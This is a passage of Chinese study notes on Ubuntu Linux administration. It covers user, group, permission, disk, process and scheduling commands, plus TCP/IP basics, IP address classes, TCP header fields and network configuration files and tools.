&#x2F;&#x2F;显示用户abc的UID-g 组ID  -G 所有组ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>修改用户个人信息 chfn</p><p>chfn命令用于修改用户的基本个人信息，如真实姓名、电话号码等。</p><pre class="line-numbers language-none"><code class="language-none">chfn -f abcdefg abc &#x2F;&#x2F;将用户abc的真实姓名改为abcdefgchfn -h 1111111 abc &#x2F;&#x2F;设置用户abc的电话号码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>删除用户 deluser</strong></font></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">deluser --remove-all-files abc //删除用户abc以及一切相关文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="P117-组管理命令"><a href="#P117-组管理命令" class="headerlink" title="P117: 组管理命令"></a>P117: 组管理命令</h4><p>cat /etc/passwd 看用户信息；cat /etc/group 看组相关信息</p><ol><li><p><strong>添加用户组 addgroup</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">addgroup abc //添加一个普通用户组addgroup --system abc //添加一个系统用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>显示组内用户 groups</p><p>groups命令用于显示某个组里包含的用户</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">groups</span> root //显示用户组root内的用户<span class="token function">groups</span> abc //显示用户组abc内的用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>修改用户组信息 groupmod</strong></p><p>groupmod命令用于更改用户组的名称、ID等信息。</p><pre class="line-numbers language-none"><code class="language-none">groupmod -g 1002 abc &#x2F;&#x2F;更改用户组abc的GID为1002groupmod -n abcd abc &#x2F;&#x2F;更改用户组abc名称为abccat &#x2F;etc&#x2F;group | grep abc &#x2F;&#x2F;查看配置文件中abc信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>删除用户组 delgroup</strong></p><pre class="line-numbers language-none"><code class="language-none">delgroup abc &#x2F;&#x2F;删除用户组abc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="P118-权限管理"><a href="#P118-权限管理" class="headerlink" title="P118: 权限管理"></a>P118: 权限管理</h4><p>Ubuntu在管理自己的用户和文件时，都是依靠权限体系来提高安全性。</p><p>权限是指某一个用户或用户组能够使用系统资源的限制情况。root管理员拥有系统的最高权限；初次创建的用户拥有管理员的部分权限；其他普通用户的权限最低。</p><p><font color=Brown>对于文件，有读r、写w、修改x(可执行权限)三种权限。(二进制表示：100, 010, 001 ; <strong>八进制表示：4, 2, 1 -&gt; r+w+x=7，故7为最高权限</strong>)</font></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210225153846.png" alt="image-20230210225153846" style="zoom:50%;" /><ul><li>“drwxr-xr-x”表明了权限与用户组的关系，除第1位表示<strong>文件类型</strong>，剩余9位以3位为一组，分别表示<strong>文件归属用户的权限 u</strong>、归属用户组的权限 g、其他用户的权限 o。</li><li>“26”表示链接数</li><li>”bd bd”表示文件拥有者和该用户所归属的用户组</li></ul><pre class="line-numbers language-none"><code class="language-none">bd的3类用户和对应权限情况：它的拥有者是bd用户，对应权限是“rwx&quot;，对该文件具有读写修改的权限与bd用户同组的其他用户，对应权限是&quot;r-x&quot;，对该文件具有读和修改的权限其他用户，对应权限是&quot;r-x&quot;，对该文件具有读和修改的权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>权限字母表示法：</strong></p><table><thead><tr><th>字母</th><th>含义</th></tr></thead><tbody><tr><td>r, w, x 表示权限</td><td>可读，可写，可执行权限</td></tr><tr><td>a, u, g, o 表示文件归属关系</td><td>所有用户，归属用户，归属组，其他用户</td></tr><tr><td>=, +, - 表示权限变化</td><td>具备权限，添加某权限，去除某权限</td></tr></tbody></table><pre class="line-numbers language-none"><code class="language-none">例子：a+x：对所有用户添加可执行权限go-x：对归属组和其他用户去除原有可执行权限u&#x3D;rxw：对归属用户具备可读、可写、可执行权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong><font color=Brown>常用权限管理命令：</font></strong></p><p>利用shell命令，可以方便地查看文件和文件夹的权限，也可以方便地对权限作出修改，还可以对文件所属用户及群组进行修改</p><ul><li><p><strong>chmod 修改文件或文件夹的权限</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">字母表示法：<span class="token function">chmod</span> a+w a.cpp //对a.cpp文件的所有用户增加可写权限数字表示法：<span class="token function">chmod</span> <span class="token number">777</span> <span class="token builtin class-name">test</span> //修改目录test的权限为777，即所有用户都拥有可读、可写、可执行权限-R实现对目录下的文件权限的递归修改：<span class="token function">chmod</span> -cR <span class="token number">755</span> test/ //将test目录下所有文件权限改为755，包括目录本身，使用-c参数显示修改结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>chown修改文件或目录的归属用户或归属组</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">chown</span> abc a.cpp //修改a.cpp文件的归属用户为abc<span class="token function">chown</span> -c abc.abc a.cpp //同时改变a.cpp文件的归属用户和用户组<span class="token function">chown</span> -v .abc a.cpp //改变a.cpp文件的归属用户组迭代：chown -cR abc <span class="token builtin class-name">test</span> //修改目录中所有文件的归属<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>chgrp专门修改文件或目录的归属组</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">chgrp</span> -c abc a.cpp //修改文件的归属组为abc<span class="token function">chgrp</span> -cR abc <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h4 id="P127-磁盘概述"><a href="#P127-磁盘概述" class="headerlink" title="P127: 磁盘概述"></a>P127: 磁盘概述</h4><p>配置文件/etc/fstab 查看磁盘分区的情况及别名</p><p>没有实际的硬盘。<font color=Brown><strong>主分区/主挂载点的别名是/dev/sda1</strong>，即“/”挂载点</font>。/dev/sda5表示逻辑分区，虚拟设备：<font color=Brown><strong>/dev/scd0光驱</strong></font>，<font color=Brown><strong>/dev/fd0软驱</strong></font>。SWAP<font color=Brown><strong>交换分区被挂载至/root/swapfile</strong></font></p><p>/dev/后面部分表示一个具体的分区，hd表示IDE硬盘，sd表示SATA硬盘或其他外部设备，had中的第3位a表示这是该类型接口上的第1个设备。每一个IDE接口可以允许有两个设备，一个是主设备，另一个为从设备，可以分别用hda、hdb表示第1个IDE接口上的两个设备。</p><p><font color=Brown><strong>/dev/hda1~/dev/hda4都表示主分区</strong></font>，<font color=Brown><strong>/dev/hda5表示该硬盘上的第1个逻辑分区</strong></font>，分区的顺序是不能随意修改。</p><h4 id="P128-磁盘管理方法"><a href="#P128-磁盘管理方法" class="headerlink" title="P128: 磁盘管理方法"></a>P128: 磁盘管理方法</h4><ul><li><p><strong>fdisk 磁盘分区</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">fdisk</span> /dev/hda //对IDE硬盘进行分区<span class="token function">fdisk</span> -l //列出当前操作系统<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>mkfs</strong> 在分区上<strong>建立文件系统</strong>或格式化指定形式</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">mkfs</span> -v //显示命令使用方法<span class="token function">mkfs</span> -V //显示版本信息<span class="token function">mkfs</span> -t ext3 /dev/sda3 //将/dev/sda3的文件系统建立为ext3类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mkswap 设置交换分区</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">mkswap</span> -c -vl /dev/sda5 <span class="token number">102400</span> //在/dev/sda5建立大小为100MB的交换分区，建立前先检查是否有损坏的区块<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>df 显示磁盘信息</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">df</span> -a //显示所有的磁盘信息-l 仅显示本地的文件系统信息 -i 显示索引节点信息<span class="token function">df</span> -t ext3 //显示系统中ext3类型的分区信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>du 显示目录的容量</strong></p><pre class="line-numbers language-none"><code class="language-none">du -a &#x2F;root &#x2F;&#x2F;显示&#x2F;root目录下每个文件的大小，以K为单位<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="P193-195-进程管理"><a href="#P193-195-进程管理" class="headerlink" title="P193-195: 进程管理"></a>P193-195: 进程管理</h4><p><font color=Brown><strong>什么是进程？什么是程序？进程有什么特点？父子进程的关系？</strong></font></p><p><strong><font color=Brown>进程的3种类型，基本信息(PID,PPID…)，3种基本状态(state,wait,running)</font></strong></p><p><strong>1.进程的概念：</strong></p><p>Ubuntu Linux 的所有任务都是在操作系统内核的调度下由CPU执行，很多时候，Linux是将任务和进程的慨念合在一起。<strong>进程的标准定义: 进程是可开发执行的程序在一个数据集合上的运行过程。</strong>进程是一个动态的使用系统资源，处于活动状态的应用程序。<strong>进程和程序有着显著的区别。</strong></p><ul><li>程序是静态概念，本身可以作为一种资源长期保存在磁盘上;进程是一个程序的执行过程,是动态概念,有一定的生命周期，如果进程一旦执行结束，就不再存在于操作系统中</li><li>进程是一个能独立运行的单位，能与其他进程并发执行，它是操作系统中资源申请调度的最小单位;而程序不能作为一个独立运行的单位，它也不占用CPU 资源</li><li>程序并不是和进程一一对应的 一个程序可以由多个进程共用,一个进程也可以在活动中有顺序地执行多个程序</li></ul><p>在Ubuntu Linux中，init进程是所有进程的发起者和控制者，每个进程都有一个编号<strong>PID</strong>，是进程在当前系统中运行的顺序。<strong>Init用于终结父进程</strong>，如果该进程出现了问题，操作系统会崩溃。</p><p>因为init进程在系统运行期间始终不会消亡或停止，所以系统总是可以确信它的存在，并在必要的时候以此为参照。因此，<strong>系统调用fork()函数来创建一个新进程</strong>，并且作为init的子进程，从而最终形成系统中运行的所有其他进程。</p><p>为了标识和管理进程，使用PCB进程控制块来进行此项重要工作。进程有以下几个主要参数：</p><ul><li><font color=Brown>PID</font>：进程号，唯一标识进程（父进程为1）        Process ID</li><li><font color=Brown>PPID</font>：父进程号，创建某个进程的上一个进程号      Parent PID</li><li>USER：启动某个进程的用户ID(UID)和该用户归属的组ID(GID)       </li><li>STAT：进程状态。一个进程可能处于多种状态，包括运行状态、等待状态（可被中断或不可被中断）、停止状态、睡眠状态和僵死状态等</li><li>PRIORITY：优先级</li><li>资源占用：占用系统资源</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">- <span class="token function">ps</span> aux  //查看当前所有运行着的进程信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><font color=Brown>Ubuntu Linux进程的3种类型：</font></strong></p><ul><li>交互进程：由Shell启动的进程</li><li>批处理进程：与终端联系不大，在等待队列中按序执行</li><li>守护进程：后台运行的进程，一般总是活动状态</li></ul><p>2.<font color=Brown><strong>进程的运行状态</strong></font></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212115553914.png" alt="image-20230212115553914" style="zoom:67%;" /><ul><li>等待状态wait：该状态有两种模式，一种是可被中断的，另一种不可被中断。这种状态下的进程处于等待系统分配给它资源，如果一旦得到资源，将转入就绪状态。</li><li>就绪状态running：这种状态的进程当前没有运行,但所有申请的资源已经具备。只要内核对其进行调度，将立即拥有CPU的控制权，开始运行。</li><li>僵死状态zombie：也称僵尸状态或僵尸进程。这种状态下的进程已经运行完毕，执行了相应的任务，已经不再存在，但它的父进程留下了一个记录，包括一个退出码和一些时间信息等。</li><li>停止状态stop：正在运行的进程由于某些原因的影响而退出，将进入停止状态，例遇到更高优先级的进程占用了CPU资源。</li><li>中断状态interupt</li></ul><blockquote><p>进程状态60</p></blockquote><p>3.进程管理操作</p><ul><li><p><strong>ps 查看系统进程信息（静态信息）</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-f:产生某个进程的一个完整信息清单。-a:显示所有用户的进程清单。-u:产生某个特定用户的进程清单。-x:显示后台运行进程。<span class="token function">ps</span> //显示与控制终端相关进程的基本信息<span class="token function">ps</span> -u abc -f //显示abc用户所有完整信息<span class="token function">ps</span> aux //显示系统中的所有进程信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>top 动态显示运行中的进程详细信息</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">top</span> -d <span class="token number">3</span> //每3秒动态更新进程信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>nice 设置进程运行优先级</strong></p><p>每个进程都有一个优先级参数，表示占有CPU资源的等级，优先级越高进程更容易获取CPU控制权。进程优先级一般为-20~19，-20为最高优先级。修改进程nice值，可以修改进程优先级。系统进程默认的优先级是0。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">nice</span> -5 process //优先级置为5。若没有指定默认置为10<span class="token function">nice</span> --12 process //优先级置为-12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong><font  color="blue">renice 修改进程的优先级</font></strong></p><p>可调范围-20~19</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">renice</span> <span class="token number">12</span> <span class="token number">7716</span> //修改PID7716的进程的优先级为12<span class="token function">sudo</span> <span class="token function">renice</span> <span class="token number">6</span> -u abc //修改abc用户所有进程优先级为6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>kill 终止进程命令</p><p>一般情况，可以通过停止一个进程的方法来正常结束该进程。但在某种情况下，进程没有响应，可使用kill命令停止某个活动。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">kill</span> -STOP <span class="token number">4385</span> //停止4385进程，但不退出<span class="token function">kill</span> -CONT <span class="token number">4385</span> //重新开始4385进程<span class="token function">kill</span> -9 <span class="token number">4385</span> //强制终止4385进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>killall 终止所有同名进程</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">killall</span> -9 process //终止系统中所有名为process的进程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="P200-临时工作安排at"><a href="#P200-临时工作安排at" class="headerlink" title="P200: 临时工作安排at"></a>P200: 临时工作安排at</h4><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212141653461.png" alt="image-20230212141653461" style="zoom: 50%;" /><ol><li><p>服务启动</p><p>at命令用来安排完成临时性工作，即只需要执行一次的系统任务。使用该命令，需要提前启动一个进程，即启动一个服务。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> /etc/init.d/atd restart  //重新启动at服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用at命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> at <span class="token number">23</span>:50 <span class="token number">2009</span>-12-15 //在2009-12-15的23：50执行以下命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>维护当前系统中的at服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> atq //查询当前系统中的所有at进程<span class="token function">sudo</span> atrm <span class="token number">1</span> //删除1号工作任务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><p><strong>周期性工作安排cron</strong></p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps1.jpg" alt="img" style="zoom:67%;" /> </center>#### P211: TCP/IP基础<p>（尽可能写全面）</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221016160838763.png" alt="image-20221016160838763" style="zoom:80%;" /><ul><li><p><strong>网络接口层</strong>（Network Interface Physical)：模型的基层，负责数据帧的发送和接收（帧Frame是独立的网络信息传输单元)。网络接口层将帧格式的数据放到网络上，或从网上把帧取下来。</p></li><li><p><strong>互联层（Internet）</strong>：互联协议将数据包封装成Internet 数掂包（IP packet)，并运行必要的路由算法。这里有4种互联协议。</p><ul><li><strong>网际协议(IP)</strong>:负责在主机和网络之间路径寻址和路由数据包。</li><li><strong>地址解析协议（ARP)</strong>:获取同一物理网络中的硬件主机地址。</li><li><strong>因特网控制消息协议（(ICMP)</strong>:发送消息，并报告有关数据包的传送错误。</li><li><strong>互联组管理协议（IGMP)</strong>:实现本地多路广播路由器报告。</li></ul></li><li><p><strong>传输层</strong>:传输协议在主机之间提供通信会话。传输协议的选择根据数据传输方式而定。主要有以下两个传输协议。</p><ul><li>传输控制协议(<strong>TCP</strong>)：为应用程序提供<strong>可靠的</strong>通信连接。适合于一次传输<strong>大批数据</strong>的情况，并适用于要求得到响应的应用程序。</li><li>用户数据包协议（<strong>UDP</strong>）:提供了无连接通信，且不对传送包进行可靠性确认。适合于一次传输<strong>小量数据</strong>可靠性则由应用层确认。</li></ul></li><li><p><strong>应用层</strong>:应用程序通过这一层访问网络，主要包括常见的FTP、HTTP、DNS和 TELNET等协议。</p><ul><li><strong>Telnet</strong>:提供远程登录(终端仿真）服务。</li><li><strong>FTP</strong>:提供应用级的文件传送协议。,</li><li><strong>SMTP</strong>:简单邮件传送协议。</li><li><strong>SNMP</strong>:简单网络管理协议，使用传输层UDP 协议。</li><li><strong>DNS</strong>:域名解析服务，也就是将域名映像成IP地址的协议，使用传输层UDP协议。</li><li><strong>HTTP</strong>:超文本传输协议，访问Web所用的协议。</li></ul></li></ul><p>TCP/IP协议簇体系结构及各层协议结构如图。 在网络接口层，最重要的信息之一是主机的MAC地址，为48bit，在物理上唯一标识某台主机；IP层的IP地址在逻辑上唯一标识某台主机；在主机内部，传输层的端口对应唯一的应用服务。</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212134419401.png" alt="image-20230212134419401" style="zoom:67%;" /><h4 id="P212-IP地址表示形式及分类"><a href="#P212-IP地址表示形式及分类" class="headerlink" title="P212: IP地址表示形式及分类"></a>P212: IP地址表示形式及分类</h4><p>1.表示形式：</p><ul><li><p>二进制表示法</p></li><li><p>点分十进制表示法</p><p>IP地址由网络号和主机号组成，程度为4字节</p><ul><li>网络号：标识一个物理的网络，同一个网络上的所有主机使用同一个网络号，该号在互联网中是唯一的。</li><li>主机号：确定网络中的一个工作端、服务器、路由器或者其他TCP/IP 主机。对于同一个网络号来说，主机号是唯一的。每个TCP/IP主机由一个逻辑IP地址确定网络号和主机号。</li></ul></li></ul><p>2.IP地址分类</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212135517579.png" alt="image-20230212135517579" style="zoom:50%;" /><ul><li><strong>A类地址</strong>: 可以拥有最大数量的主机，最高位为0，紧跟的7位表示网络号，其余24位表示主机号，总共允许有 126个网络。</li><li><strong>B类地址</strong>: 被分配到中等规模和大规候的网络中，最高两位总被置为二进制的10，前16位为网络号，后16位 为主机号，允许有16384个网络。</li><li><strong>C类地址</strong>：高3为被置为二进制的110，前 24位为网络号，后8位为主机号，允许有大约200万个网络。</li><li>D类地址:被用于多路广播组用户，高4位总被置为1110,余下的位用于标明客户机所属的组。</li><li>E类地址是一种仅供试验的地址。</li></ul><p>几条准则：</p><ul><li>网络号不能为127。该标识号被保留作为回路及诊断功能。</li><li>不能将网络号和主机号的各位均置为1。如果每位都是1,该地址会被解释为网内广播而不是一个主机号</li><li>各位均不能置0，否则该地址被解释为“就是本网络”。</li><li>对于本网络来说，主机号应核唯一，否则会出现IP地址已分配或有冲突的错</li></ul><p><strong>网络划分标准</strong></p><h4 id="P217-TCP包头"><a href="#P217-TCP包头" class="headerlink" title="P217: TCP包头"></a>P217: TCP包头</h4><p>cat /usr/include/linux/tcp.h</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212221150069.png" alt="image-20230212221150069" style="zoom: 67%;" /><ol><li>源端口和目标端口(Source Port&amp;Destinaton Port):传送/接收数据使用的端口。</li><li>数据包序号(Sequence Number)：数据包过大而进行分段后，记录数据包序号，接收方可以组合成功</li><li>回应序号 (Acknowledge Number):为了确认接收端收到发送端所送出的数据包数据,发送端希望能吸收到接收端的响应。</li><li><strong>数据补偿（Data Offset):补偿位。</strong></li><li>保留位（Reserved ):未使用的保留字段。</li><li>控制标志码（Control Flag):当进行网络连接时，必须说明这个联机的状态，使接收端了解这个数据包的主要动作。这个子段为6bits，分别代表6个句柄，若为1则为启动。说明如下所示。<ul><li> URG （Urgent)）: 为1表示该数据包为紧急数据包，接收端应该紧急处理。</li><li>ACK (Acknowledge):为1表示这个数据包为确认数据包，与Acknowledge Number有关</li><li>PSH (Push function):为1表示要求对方立即传送缓冲区内的其他对应数据包，而无须等待缓冲区满。</li><li>RST （Reset):为1表示联机会马上结束，而无须等待终止确认手续。这是个强制结束的联机,且发送端已断线。</li><li>SYN (Svnchronous):为1表示发送端希望双方建立同步处理，即要求建立联机。通常带有SYN标志的数据包表示“主动”要连接到对方的意思。</li></ul></li><li><strong>滑动窗口</strong>（Window):用于控制数据包的流量，可以告知对方目前有多少缓冲区容量(Receive Buffer)可以接收数据包。当Window=0时，表示缓冲器已经额满。</li><li><strong>确认校验码</strong>（Checksum);数据由发送端送出前会进行一个检验的动作，并将该动作的检验值标注在这个字段上。而接收者收到这个数据包之后，会再次对数据包进行验证，并且与原来发送的确认校验码值进行对比,如果相符就接收，若不符就认为该数据包已经损毁，要求对方</li><li><strong>紧急信息</strong> （Urgent Pointer ):该字段在 Code字段内的URG值为1时才会产生作用，告知紧急数据所在的位置。</li><li>任意资料（Options）</li></ol><h4 id="P220-ARP-RARP概念"><a href="#P220-ARP-RARP概念" class="headerlink" title="P220: ARP/RARP概念"></a>P220: ARP/RARP概念</h4><p>任何一台主机（确切的说是任何一个网络适配器）在物理上唯一的标识是48bit适配器的地址，即MAC地址 ( Media Access Controladdress)。这个地址保存在网络适配器的ROM中，是不能修改的。在实际应用中,田户可 以为任意一个网络适配器指定不同的IP地址。</p><p>MAC地址是所有网络活动的基础,但是网上的主机之间的通信是通过IP地址讲行的,因此在这个过程中就存在一个转换，即MAC地址与IP地址的对应，实现这一地址解析的协议为ARP(地址解析协议）和RARP（逆地址解析协议）。</p><ul><li>ARP为IP地址到对应的硬件MAC 地址之间提供动态映射，这个过程是自动完成的,一般应用程序或系统管理员不必操作中间流程。</li><li>RARP用于那些没有磁盘驱动器的系统（一般是无盘工作站或X终端)，它需要系统管理员进行手工设置，提供MAC地址到IP地址的解析。</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212221237222.png" alt="image-20230212221237222" style="zoom: 80%;" /><h4 id="P225-227-网络配置文件"><a href="#P225-227-网络配置文件" class="headerlink" title="P225-227: 网络配置文件"></a>P225-227: 网络配置文件</h4><p>Ubuntu Linux为适应不同需求，在进行网络访问时，需要配置网络配置文件，这些配置文件位于”/etc“目录下。</p><p><strong>1./etc/network/interfaces网络基本信息配置文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">cat</span> /etc/network/interfaces//lo接口的配置信息<span class="token number">1</span> auto lo //系统开机时，自动启动lo接口<span class="token number">2</span> iface lo inet loopback //设置lo接口的地址信息，此处设置为本地回环<span class="token punctuation">(</span>loopback<span class="token punctuation">)</span><span class="token number">3</span>//系统中一块网卡eth0接口的配置信息//一个网卡对应一个地址的基本配置方法：<span class="token number">4</span> auto eth0 //系统开机时，自动启动eth0接口，该接口为系统默认的第一块网卡所在的接口<span class="token number">5</span> iface eth0 inet dhcp //设置eth0接口的地址信息，此处设置为动态自动获取<span class="token punctuation">(</span>dhcp<span class="token punctuation">)</span><span class="token number">6</span> address <span class="token number">192.168</span>.1.21 //设置eth0接口的一个静态IP地址为192.168.1.21<span class="token number">7</span> netmask <span class="token number">255.255</span>.255.0 //设置eth0接口的子网掩码为255.255.255.0<span class="token number">8</span> gateway <span class="token number">192.168</span>.1.1 //设置eth0接口的静态网关地址为192.168.1.1//同一个物理网卡设备上有多个地址的基本配置方法：<span class="token number">11</span> auto eth0 eth0:1<span class="token number">12</span> iface eth0 inet static<span class="token number">13</span> address <span class="token number">192.168</span>.1.100<span class="token number">14</span> netmask <span class="token number">255.255</span>.255.0<span class="token number">15</span> gateway <span class="token number">192.168</span>.1.1 <span class="token number">16</span> iface eth0:1 inet static<span class="token number">17</span> address <span class="token number">192.168</span>.1.200<span class="token number">18</span> netmask <span class="token number">255.255</span>.255.0<span class="token number">19</span> gateway <span class="token number">192.168</span>.1.1 //不同接口上配置多个网卡的基本配置方法：<span class="token number">21</span> auto eth0 eth1<span class="token number">22</span> iface eth0 inet static<span class="token number">23</span> address <span class="token number">192.168</span>.0.125<span class="token number">24</span> netmask <span class="token number">255.255</span>.255.0<span class="token number">25</span> gateway <span class="token number">192.168</span>.1.1 <span class="token number">26</span> iface eth1 inet static<span class="token number">27</span> address <span class="token number">192.168</span>.0.137<span class="token number">28</span> netmask <span class="token number">255.255</span>.255.0<span class="token number">29</span> gateway <span class="token number">192.168</span>.1.1 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(auto lo)</p><p><strong>2.其他网络相关配置文件</strong></p><p>（考基本的端口号）</p><ul><li><p>/etc/hosts 主机名映射文件</p><p>在网络上实现域名和IP地址的映射的两种方法：大量域名解析采用DNS服务器，小型网络可使用/etc/hosts文件提供解析。文件包含部分常用IP地址和主机名/主机名别名之间的映射</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;文件种没有tom主机信息，因此会登陆失败。添加tom记录：$ sudo vim &#x2F;etc&#x2F;hosts127.0.0.1 localhost127.0.1.1 abc &#x2F;&#x2F;当前用户192.168.1.93 netservice.webservice.bamms.com tom&#x2F;&#x2F;登录主机$ftp tom<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>/etc/host.conf 配置名称解析器</p><pre class="line-numbers language-none"><code class="language-none">$ cat &#x2F;etc&#x2F;host.conforder hosts,bindmulti on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>”order”指定主机名查询顺序，其参数用逗号隔开的查找方法。支持的查找方法为bind和hosts，分别代表DNS、/etc/hosts，此处规定先查询/etc/hosts文件，然后再使用DNS来解析域名</p></li><li><p><font color=Brown><strong>/etc/services 端口映射文件</strong></font></p><p>(判断)</p><pre class="line-numbers language-none"><code class="language-none">ftp-data 20&#x2F;tcpftp 21&#x2F;tcpfsp 21&#x2F;udp  fspdssh 22&#x2F;tcptelnet 23&#x2F;tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>/etc/resolv.conf 配置DNS客户</p></li></ul><h4 id="P228-P233-常用网络管理工具"><a href="#P228-P233-常用网络管理工具" class="headerlink" title="P228-P233: 常用网络管理工具"></a>P228-P233: 常用网络管理工具</h4><ul><li><p><strong>ifconfig 配置网络地址信息</strong></p><p>显示或临时配置当前主机某张网卡的IP地址。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">interface 网络接口的名称，如eth0<span class="token punctuation">(</span>网卡<span class="token punctuation">)</span> <span class="token function">ifconfig</span> eth0 //查看eth0的网络情况<span class="token function">ifconfig</span> eth0 up/down //激活或关闭eth0<span class="token function">ifconfig</span> eth0 <span class="token number">192.168</span>.0.25 netmask <span class="token number">255.255</span>.255.0 //设置eth0的IP地址和子网掩码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>nslookup 域名解析测试</strong></p><p>查询一台机器的IP地址和其对应的域名，使用权限为所有用户，它一般需要一台域名服务器来提供域名服务。“&gt;”后输入查询IP地址，“exit”退出。</p></li><li><p><strong>ping 测试网络状态</strong></p><p>测试网络是否可达。“Time out”主机不可达，若数据包丢失严重则说明网络很不稳定。</p><pre class="line-numbers language-none"><code class="language-none">ping www.baidu.com -c 3 &#x2F;&#x2F;发送三个数据包来测试<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>ip 网络配置工具</p><p>ip [options] object [ command [arguments] ]</p><ul><li><p>options参数</p><ul><li>-v 打印iproute信息</li><li>-r 将ip地址转换成域名</li><li>-s 输出详细结果</li></ul></li><li><p>object 管理对象</p><ul><li>Link 网络接口设备，通常网卡</li><li>Address IP地址</li><li>Neighbour ARP记录</li><li>Rule 路由策略</li></ul><p>……</p></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">ip</span> addr <span class="token function">add</span> <span class="token number">192.168</span>.44.122 dev eth0 //添加IP地址到eth0网卡上<span class="token function">sudo</span> <span class="token function">ip</span> rule <span class="token function">add</span> from <span class="token number">192.168</span>.0.25 prio <span class="token number">32777</span> reject //丢弃源地址属于192.168.0.25网络的所有数据包<span 